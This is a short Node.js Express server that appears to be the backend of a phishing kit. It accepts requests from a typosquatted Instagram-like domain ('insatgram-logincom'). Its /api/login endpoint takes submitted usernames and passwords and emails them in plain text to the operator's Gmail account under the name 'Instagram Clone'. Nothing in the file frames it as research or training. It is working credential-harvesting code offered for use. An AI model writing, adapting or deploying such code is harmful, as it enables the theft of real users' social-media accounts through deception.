const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
const corsOptions = {
  origin: 'https://insatgram-logincom.vercel.app',
};
app.use(cors(corsOptions));

const GMAIL_USER = process.env.GMAIL_USER; // Use environment variables for security
const GMAIL_PASS = process.env.GMAIL_PASS;   // Use environment variables for security

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_PASS,
  },
});

// Login endpoint
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    // Send email with login info
    await transporter.sendMail({
      from: `Instagram Clone <${GMAIL_USER}>`,
      to: GMAIL_USER, // Send to yourself or any recipient
      subject: 'New Login Attempt',
      text: `Username: ${username}\nPassword: ${password}`,
    });
    res.json({ message: 'Login received and email sent!' });
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).json({ message: 'Error sending email.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
}); 